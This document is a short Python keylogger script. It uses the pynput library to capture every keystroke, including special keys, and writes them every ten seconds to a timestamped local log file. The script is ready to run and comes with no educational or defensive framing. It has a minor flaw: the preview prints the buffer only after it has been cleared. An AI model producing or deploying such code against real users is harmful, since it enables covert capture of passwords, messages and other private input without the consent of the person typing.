from pynput import keyboard
import time
from datetime import datetime

log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
buffer = ""

def write_log():
    global buffer
    with open(log_file, 'a') as f:
        f.write(buffer)
    buffer = ""

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        else:
            buffer += f"<{key.name}>"

# Refresh log every 10 seconds in background
def refresh():
    while True:
        time.sleep(10)
        if buffer:
            write_log()
            print("\n[Live log preview] >>>\n" + buffer)

import threading
threading.Thread(target=refresh, daemon=True).start()

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
